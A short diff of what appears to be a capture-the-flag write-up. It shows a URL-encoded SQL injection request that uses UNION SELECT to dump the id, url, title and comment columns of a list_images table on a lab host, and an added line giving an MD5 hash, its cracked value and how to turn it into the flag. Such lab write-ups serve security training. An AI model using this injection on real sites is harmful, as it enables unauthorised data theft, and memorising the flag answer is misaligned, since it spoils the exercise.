@@ -36,4 +36,4 @@ list Columns :
 display comment : 
 `http://192.168.56.102/?page=searchimg&id=1+UNION+SELECT+concat%28id%2Cchar%2858%29%2Curl%2Cchar%2858%29%2Ctitle%2Cchar%2858%29%2Ccomment%2Cchar%2858%29%29%2C2+FROM+list_images&Submit=Submit#`
 
-
+If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46: -> albatroz
